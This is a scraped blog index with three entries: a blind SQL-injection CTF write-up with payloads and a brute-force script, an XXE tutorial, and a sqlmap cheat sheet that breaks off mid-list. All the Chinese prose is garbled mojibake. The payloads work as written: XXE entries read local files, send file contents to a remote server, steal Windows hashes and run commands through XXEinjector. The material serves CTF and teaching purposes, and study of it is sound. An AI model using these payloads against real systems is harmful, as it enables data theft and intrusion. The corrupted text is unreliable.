&#x27;?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\\&#x27;ctf\\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))#çˆ†ç ´åˆ—åpayload = &#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\&#x27;users\\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))#çˆ†ç ´å­—æ®µpayload = &#x27;?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i,ord(s))è¿™é‡Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œå‘ç°çˆ†ç ´å­—æ®µå¾—åˆ°çš„ç»“æœä¸æ˜¯ctfä¸‹çš„usersçš„å­—æ®µï¼Œå› ä¸ºæ²¡æœ‰åŠ ctfè¿™ä¸ªé™åˆ¶ï¼Œåº”è¯¥æ˜¯çˆ†ç ´åˆ°äº†å…¶ä»–æ•°æ®åº“ä¸‹çš„usersä¸­çš„å­—æ®µï¼Œéœ€è¦åŠ ä¸Šæ•°æ®åº“åctfçš„é™åˆ¶æ¡ä»¶ï¼Œä¸è¿‡è¿™é‡Œé¢˜ç›®æœ‰å¯¹ â€˜andâ€™å…³é”®å­—è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦ç”¨â€˜&amp;&amp;â€™æ›¿æ¢ï¼Œè€Œä¸”è¿˜è¦ç¼–ç ä¸ºulræ ¼å¼â€˜%26%26â€™ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç”¨brupsuitæŠ“åŒ…åˆ†æäº†å¾ˆä¹…æ‰å‘ç°çš„ï¼Œä¸è¿‡åªè¦æœ‰è€å¿ƒï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå‘ç°ã€‚ä¿®æ”¹åçš„payloadpayload = &#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\\&#x27;users\\&#x27;/**/%26%26/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;.format(i, ord(s))\n\n\nå…³é”®å‡½æ•°è§£é‡Š\nmid() å‡½æ•°ï¼šæˆªå–å­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ï¼Œmid(column_name,start[,length])\nord() å‡½æ•°ï¼šæ˜¯ chr() å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸²ï¼‰ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ã€‚è¿”å›å€¼æ˜¯å¯¹åº”çš„åè¿›åˆ¶æ•´æ•°ã€‚\ngroup_concat() å‡½æ•°ï¼šè¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚èƒ½ä¸€æ¬¡æ€§æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯ã€‚group_concat(str1,str2,â€¦)\n\n\n\n\næœ€åå¾—çŸ¥çš„ä¿¡æ¯\n\nTables_in_ctf: users,imagesColumns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password(æ­¤å¤„ä¸writeupæœ‰å‡ºå…¥)values_in_users: adminf5b86501931f812ed3833dee67a43603\t\t\t\t adminc6ef523a171bb9a25f4115044b507d69\n\n\n\nç™»å½•æˆåŠŸå\n\n\næ­¤å¤„æµ‹è¯•å‘ç°æœ‰ssrfæ¼æ´ è¾“å‡º127.0.0.1ååé¦ˆä¿¡æ¯å‡ºç°äº†(curl)\n\næŠ“åŒ…å¾—åˆ°flag\n\nå®˜æ–¹æ³¨å…¥è„šæœ¬import requestsimport stringcharset = &quot;,@&quot;+ string.digits + string.ascii_lowercase + string.ascii_uppercasedef r(s):    s = s.replace(&quot; &quot;, &quot;/**/&quot;)    return ssql = r(&quot;select concat(id,username,password) from users&quot;)result = &quot;&quot;for i in range(1,50):    for c in charset:        cc = ord(c)        url = f&quot;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid((&#123;sql&#125;),&#123;i&#125;,1))=&#123;cc&#125;)&quot;        r = requests.get(url)        if len(r.text) &gt; 1024:            result += c            print(result)            break\n\n\n","categories":["CTF","ctfhub"],"tags":["web","sqlæ³¨å…¥","ssrf"]},{"title":"XML XXEæ¼æ´","url":"/XML-XXE%E6%BC%8F%E6%B4%9E/","content":"XML XXEæ¼æ´åŸºç¡€æ¦‚å¿µ1ã€xmlåŸºç¡€æ¦‚å¿µXMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒXMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXEæ¼æ´å…¨ç§°XMLExternal Entity Injectionï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚\n2ã€XMLä¸HTMLçš„ä¸»è¦å·®å¼‚XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚\nHTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚\nHTMLæ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚\n3ã€xmlç¤ºä¾‹&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;&lt;!DOCTYPE note [\t&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ—¶noteç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;\t&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;\t\t\t&lt;!--å®šä¹‰toå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;\t\t&lt;!--å®šä¹‰fromå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;\t\t&lt;!--å®šä¹‰headå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;\t\t&lt;!--å®šä¹‰bodyå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹--&gt;]]]&gt;&lt;!--æ–‡æ¡£å…ƒç´ --&gt;&lt;note&gt;    &lt;to&gt;Dave&lt;/to&gt;    &lt;from&gt;Tom&lt;/from&gt;    &lt;head&gt;Reminder&lt;/head&gt;    &lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;\n\nDTDDTDï¼šDocument Type Definition  å³æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨)ï¼Œç”±äºå…¶æ”¯æŒçš„æ•°æ®ç±»å‹æœ‰é™ï¼Œæ— æ³•å¯¹å…ƒç´ æˆ–å±æ€§çš„å†…å®¹è¿›è¡Œè¯¦ç»†è§„èŒƒï¼Œåœ¨å¯è¯»æ€§å’Œå¯æ‰©å±•æ€§æ–¹é¢ä¹Ÿæ¯”ä¸ä¸ŠXML Schemaã€‚\nDTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š\n\n1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚\n2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚\n\nDTDå®ä½“æœ‰ä»¥ä¸‹å‡ ç§å£°æ˜æ–¹å¼\nå†…éƒ¨å®ä½“&lt;!DOCTYPE note [    &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;note&gt;&amp;a&lt;/note&gt;&lt;!-- admin --&gt;\n\nå‚æ•°å®ä½“&lt;!DOCTYPE note&gt; [    &lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;    %b;]&gt;&lt;note&gt;&amp;b1&lt;/note&gt;&lt;!-- awsl --&gt;\n\n\nå‚æ•°å®ä½“ç”¨% nameç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨%name;ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ã€‚\nå…¶ä½™å®ä½“ç›´æ¥ç”¨nameç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨&amp;name;ï¼Œåªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨\n\nå¤–éƒ¨å®ä½“&lt;!DOCTYPE note&gt; [    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;note&gt;&amp;c&lt;/note&gt;&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;\n\nå¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒï¼Œä½†å­˜åœ¨ä¸€äº›é€šç”¨çš„åè®®ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š\n\nä¸Šå›¾æ˜¯é»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥æ”¯æŒå…¶ä»–ï¼Œå¦‚PHPæ”¯æŒçš„æ‰©å±•åè®®æœ‰\n\né¶åœºè®²è§£ (pikachu xxeæ¼æ´)\n\næ–‡ä»¶è¯»å–\n\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [    &lt;!ENTITY xxe SYSTEM &quot;file:///d:/test.txt&quot; &gt; ]&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n\n\nå†…ç½‘æ¢é’ˆæˆ–æ”»å‡»å†…ç½‘åº”ç”¨ï¼ˆè§¦å‘æ¼æ´åœ°å€ï¼‰\n\n&lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTYTY rabbit SYSTEM &quot;http://192.168.1.4:80/index.txt&quot;&gt;]&gt;&lt;foo&gt;&amp;rabbit;&lt;/foo&gt;\n\nä¸Šé¢çš„ipåœ°å€å‡è®¾å°±æ˜¯å†…ç½‘çš„ä¸€å°æœåŠ¡å™¨çš„ipåœ°å€ã€‚è¿˜å¯ä»¥è¿›è¡Œä¸€ä¸ªç«¯å£æ‰«æï¼Œçœ‹ä¸€ä¸‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚\næ— å›æ˜¾-è¯»å–æ–‡ä»¶\n&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE test [\t\t&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;\t\t&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;\t\t%dtd;\t\t%send;]&gt;test.dtd:&lt;!ENTITY % payload\t&quot;&lt;!ENTITY &amp;#x25; send SYSTEM&#x27;http://192.168.xx.xxx:80xx/?data=%file;&#x27;&gt;&quot;&gt;%payload;\n\nä¸Šé¢çš„urlä¸€èˆ¬æ˜¯è‡ªå·±çš„ç½‘ç«™ï¼Œé€šè¿‡ç¬¬ä¸€æ­¥è®¿é—®æ–‡ä»¶ï¼Œç„¶åå†è®¿é—®dtdæ–‡ä»¶ï¼ŒæŠŠè¯»å–åˆ°çš„æ•°æ®èµ‹ç»™dataï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦å†è‡ªå·±çš„ç½‘ç«™æ—¥å¿—ï¼Œæˆ–è€…å†™ä¸ªphpè„šæœ¬ä¿å­˜ä¸‹æ¥ï¼Œå°±èƒ½çœ‹åˆ°è¯»å–åˆ°çš„æ–‡ä»¶æ•°æ®äº†ã€‚\nç»•è¿‡ENTITY SYSTEM fileç­‰å…³é”®è¯è¢«è¿‡æ»¤ä½¿ç”¨ç¼–ç æ–¹å¼ç»•è¿‡ï¼šUTF-16BE cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml\nè‹¥httpè¢«è¿‡æ»¤ï¼Œå¯ä»¥\ndata:&#x2F;&#x2F;åè®®ç»•è¿‡&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a &quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;&gt;     %a;    %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;\n\nfile:&#x2F;&#x2F;åè®®åŠ æ–‡ä»¶ä¸Šä¼ &lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;\n\nphp:&#x2F;&#x2F;filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ &lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;\n\n\n\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n\nxxeå·¥å…·â€‹          XXEinjectoræœ¬èº«æä¾›äº†éå¸¸éå¸¸ä¸°å¯Œçš„æ“ä½œé€‰é¡¹ï¼Œæ‰€ä»¥å¤§å®¶åœ¨åˆ©ç”¨XXEinjectorè¿›è¡Œæ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œè¯·è‡ªä¹ äº†è§£è¿™äº›é…ç½®é€‰é¡¹ï¼Œä»¥æœ€å¤§é™åº¦åœ°å‘æŒ¥XXEinjectorçš„åŠŸèƒ½ã€‚å½“ç„¶äº†ï¼Œç”±äºXXEinjectoræ˜¯åŸºäºRubyå¼€å‘çš„ï¼Œæ‰€ä»¥Rubyè¿è¡Œç¯å¢ƒå°±æ˜¯å¿…é¡»çš„äº†ã€‚è¿™é‡Œå»ºè®®åœ¨kaliç¯å¢ƒä¸‹è¿è¡Œã€‚\nå‚æ•°è¯´æ˜--host     \t\t\tå¿…å¡«é¡¹â€“ ç”¨äºå»ºç«‹åå‘é“¾æ¥çš„IPåœ°å€ã€‚(--host=192.168.0.2)--file      \t\tå¿…å¡«é¡¹- åŒ…å«æœ‰æ•ˆHTTPè¯·æ±‚çš„XMLæ–‡ä»¶ã€‚(--file=/tmp/req.txt)--path           å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦æšä¸¾ç›®å½• â€“ æšä¸¾è·¯å¾„ã€‚(--path=/etc)--brute          å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦çˆ†ç ´æ–‡ä»¶ -çˆ†ç ´æ–‡ä»¶çš„è·¯å¾„ã€‚(--brute=/tmp/brute.txt)--logger        \tè®°å½•è¾“å‡ºç»“æœã€‚--rhost          è¿œç¨‹ä¸»æœºIPæˆ–åŸŸååœ°å€ã€‚(--rhost=192.168.0.3)--rport          è¿œç¨‹ä¸»æœºçš„TCPç«¯å£ä¿¡æ¯ã€‚(--rport=8080)--phpfilter    \tåœ¨å‘é€æ¶ˆæ¯ä¹‹å‰ä½¿ç”¨PHPè¿‡æ»¤å™¨å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡ŒBase64ç¼–ç ã€‚--netdoc     \t\tä½¿ç”¨netdocåè®®ã€‚(Java).--enumports   æšä¸¾ç”¨äºåå‘é“¾æ¥çš„æœªè¿‡æ»¤ç«¯å£ã€‚(--enumports=21,22,80,443,445)--hashes       çªƒå–è¿è¡Œå½“å‰åº”ç”¨ç¨‹åºç”¨æˆ·çš„Windowså“ˆå¸Œã€‚--expect        ä½¿ç”¨PHP expectæ‰©å±•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚(--expect=ls)--upload       ä½¿ç”¨Java jarå‘ä¸´æ—¶ç›®å½•ä¸Šä¼ æ–‡ä»¶ã€‚(--upload=/tmp/upload.txt)--xslt      \t\tXSLTæ³¨å…¥æµ‹è¯•ã€‚--ssl              ä½¿ç”¨SSLã€‚--proxy         ä½¿ç”¨ä»£ç†ã€‚(--proxy=127.0.0.1:8080)--httpport \t\tSetè‡ªå®šä¹‰HTTPç«¯å£ã€‚(--httpport=80)--ftpport       è®¾ç½®è‡ªå®šä¹‰FTPç«¯å£ã€‚(--ftpport=21)--gopherport  è®¾ç½®è‡ªå®šä¹‰gopherç«¯å£ã€‚(--gopherport=70)--jarport       è®¾ç½®è‡ªå®šä¹‰æ–‡ä»¶ä¸Šä¼ ç«¯å£ã€‚(--jarport=1337)--xsltport  \tè®¾ç½®è‡ªå®šä¹‰ç”¨äºXSLTæ³¨å…¥æµ‹è¯•çš„ç«¯å£ã€‚(--xsltport=1337)--test     \t\tè¯¥æ¨¡å¼å¯ç”¨äºæµ‹è¯•è¯·æ±‚çš„æœ‰æ•ˆã€‚--urlencode     URLç¼–ç ï¼Œé»˜è®¤ä¸ºURIã€‚--output       çˆ†ç ´æ”»å‡»ç»“æœè¾“å‡ºå’Œæ—¥å¿—ä¿¡æ¯ã€‚(--output=/tmp/out.txt)--timeout     è®¾ç½®æ¥æ”¶æ–‡ä»¶/ç›®å½•å†…å®¹çš„Timeoutã€‚(--timeout=20)--contimeout  è®¾ç½®ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥çš„ï¼Œé˜²æ­¢DoSå‡ºç°ã€‚(--contimeout=20)--fast     \t\tè·³è¿‡æšä¸¾è¯¢é—®ï¼Œæœ‰å¯èƒ½å‡ºç°ç»“æœå‡é˜³æ€§ã€‚--verbose     æ˜¾ç¤ºverboseä¿¡æ¯ã€‚\n\nå·¥å…·ä½¿ç”¨æšä¸¾HTTPSåº”ç”¨ç¨‹åºä¸­çš„&#x2F;etcç›®å½•ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt â€“ssl\n\nä½¿ç”¨gopherï¼ˆOOBæ–¹æ³•ï¼‰æšä¸¾&#x2F;etcç›®å½•ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher\n\näºŒæ¬¡æ¼æ´åˆ©ç”¨ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt\n\nä½¿ç”¨HTTPå¸¦å¤–æ–¹æ³•å’Œnetdocåè®®å¯¹æ–‡ä»¶è¿›è¡Œçˆ†ç ´æ”»å‡»ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http â€“netdoc\n\né€šè¿‡ç›´æ¥æ€§æ¼æ´åˆ©ç”¨æ–¹å¼è¿›è¡Œèµ„æºæšä¸¾ï¼š\nruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK\n\næšä¸¾æœªè¿‡æ»¤çš„ç«¯å£ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all\n\nçªƒå–Windowså“ˆå¸Œï¼š\nruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt â€“hashes\n\nä½¿ç”¨Java jarä¸Šä¼ æ–‡ä»¶ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf\n\nä½¿ç”¨PHP expectæ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls\n\næµ‹è¯•XSLTæ³¨å…¥ï¼š\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt â€“xslt\n\nè®°å½•è¯·æ±‚ä¿¡æ¯ï¼š\nruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt\n\n","categories":["Web"],"tags":["XML","XXE"]},{"title":"sqlmap å¸¸ç”¨æŒ‡ä»¤","url":"/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","content":"sqlmap å¸¸ç”¨æŒ‡ä»¤SQLMap æ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–çš„SQLæ³¨å…¥æµ‹è¯•å·¥å…·ï¼Œåœ¨ kali ä¸Šå·²é›†æˆ\nåŸºæœ¬æ“ä½œç¬”è®°ï¼š-u  #æ³¨å…¥ç‚¹ -f  #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹ -b  #è·å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯ -p  #æŒ‡å®šå¯æµ‹è¯•çš„å‚æ•°(?page=1&amp;id=2 -p &quot;page,id&quot;) -D &quot;&quot;  #æŒ‡å®šæ•°æ®åº“å -T &quot;&quot;  #æŒ‡å®šè¡¨å -C &quot;&quot;  #æŒ‡å®šå­—æ®µ -s &quot;&quot;  #ä¿å­˜æ³¨å…¥è¿‡ç¨‹åˆ°ä¸€ä¸ªæ–‡ä»¶,è¿˜å¯ä¸­æ–­ï¼Œä¸‹æ¬¡æ¢å¤åœ¨æ³¨å…¥(ä¿å­˜ï¼š-s &quot;xx.log&quot;ã€€ã€€æ¢å¤:-s &quot;xx.log&quot; --resume) --level=(1-5) #è¦æ‰§è¡Œçš„æµ‹è¯•æ°´å¹³ç­‰çº§ï¼Œé»˜è®¤ä¸º1 \t--level1ï¼šé»˜è®¤çš„ç­‰çº§ï¼Œä¼šè¿›è¡ŒåŸºæœ¬çš„æµ‹è¯•ï¼ŒåŒ…æ‹¬GETå’ŒPOSTæ–¹å¼ã€‚\t--level2: åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¢åŠ å¯¹cookieçš„æ£€æµ‹ã€‚ \t--level3: å¢åŠ å¯¹User Agentã€Referer çš„æ£€æµ‹ \t--lever4: æ›´å¤šçš„payload \t--level5: æœ€é«˜ç­‰çº§ï¼ŒåŒ…å«æ‰€æœ‰çš„payload,ä¼šå°è¯•è‡ªåŠ¨ç ´è§£å‡ºcookieã€xffç­‰å¤´éƒ¨æ³¨å…¥ã€‚\t--risk=(0-3)  #æµ‹è¯•æ‰§è¡Œçš„é£é™©ç­‰çº§ï¼Œé»˜è®¤ä¸º1 --time-sec=(2,5) #å»¶è¿Ÿå“åº”ï¼Œé»˜è®¤ä¸º5 --data #é€šè¿‡POSTå‘é€æ•°æ® --columns        #åˆ—å‡ºå­—æ®µ --current-user   #è·å–å½“å‰ç”¨æˆ·åç§° --current-db     #è·å–å½“å‰æ•°æ®åº“åç§° --users          #åˆ—æ•°æ®åº“æ‰€æœ‰ç”¨æˆ· --passwords      #æ•°æ®åº“ç”¨æˆ·æ‰€æœ‰å¯†ç  --privileges     #æŸ¥çœ‹ç”¨æˆ·æƒé™(--privileges -U root) -U               #æŒ‡å®šæ•°æ®åº“ç”¨æˆ· --dbs            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ --tables -D &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ --columns -T &quot;user&quot; -D &quot;mysql&quot;      #åˆ—å‡ºmysqlæ•°æ®åº“ä¸­çš„userè¡¨çš„æ‰€æœ‰å­—æ®µ --dump-all            #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨ --exclude-sysdbs      #åªåˆ—å‡ºç”¨æˆ·è‡ªå·±æ–°å»ºçš„æ•°æ®åº“å’Œè¡¨ --dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„å­—æ®µçš„æ•°æ®(--dump -T users -D master -C surname) --dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # åˆ—å‡ºæŒ‡å®šæ•°æ®åº“çš„è¡¨çš„2-4å­—æ®µçš„æ•°æ® --dbms    #æŒ‡å®šæ•°æ®åº“(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) --os      #æŒ‡å®šç³»ç»Ÿ(Linux,Windows) -v  #è¯¦ç»†çš„ç­‰çº§(0-6)     0ï¼šåªæ˜¾ç¤ºPythonçš„å›æº¯ï¼Œé”™è¯¯å’Œå…³é”®æ¶ˆæ¯ã€‚     1ï¼šæ˜¾ç¤ºä¿¡æ¯å’Œè­¦å‘Šæ¶ˆæ¯ã€‚     2ï¼šæ˜¾ç¤ºè°ƒè¯•æ¶ˆæ¯ã€‚     3ï¼šæœ‰æ•ˆè½½è·æ³¨å…¥ã€‚     4ï¼šæ˜¾ç¤ºHTTPè¯·æ±‚ã€‚     5ï¼šæ˜¾ç¤ºHTTPå“åº”å¤´ã€‚     6ï¼šæ˜¾ç¤ºHTTPå“åº”é¡µé¢çš„å†…å®¹ --privileges  #æŸ¥çœ‹æƒé™ --is-dba      #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ --roles       #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² --udf-inject  #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼‰ --union-check  #æ˜¯å¦æ”¯æŒunion æ³¨å…¥ --union-cols #union æŸ¥è¯¢è¡¨è®°å½• --union-test #union è¯­å¥æµ‹è¯• --union-use  #é‡‡ç”¨union æ³¨å…¥ --union-tech orderby #unioné…åˆorder by --data &quot;&quot; #POSTæ–¹å¼æäº¤æ•°æ®(--data &quot;page=1&amp;id=2&quot;) --cookie &quot;ç”¨;å·åˆ†å¼€&quot;      #cookieæ³¨å…¥(--cookies=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;) --referer &quot;&quot;     #ä½¿ç”¨refereræ¬ºéª—(--referer &quot;http://www.baidu.com&quot;) --user-agent &quot;&quot;  #è‡ªå®šä¹‰user-agent --proxy &quot;http://127.0.0.1:8118&quot; #ä»£ç†æ³¨å…¥ --string=&quot;&quot;    